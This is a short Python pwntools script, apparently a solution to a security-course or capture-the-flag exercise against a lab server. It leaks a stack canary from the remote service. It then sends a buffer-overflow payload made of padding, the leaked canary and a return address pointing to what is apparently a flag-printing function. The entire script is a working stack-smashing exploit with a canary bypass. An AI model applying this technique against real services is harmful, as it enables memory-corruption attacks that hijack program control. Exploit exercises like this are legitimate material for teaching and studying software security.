from pwn import *

context.log_level = 'debug'
io = remote('inf226.puffling.no', 7002)

buffer_size = 16
padding_size = 8

getting_canary = b"24"
io.recvline()
io.sendline(getting_canary)
canary = io.recvline().decode()
canary = int(canary, 16)
flag = p64(0x401236)

# Padding til canary (overwrite), deretter padding til getflag


io.sendline(b"A" * (buffer_size+padding_size) + p64(canary) + b'A' * padding_size + flag)

print(io.recvuntil(":", timeout=1))
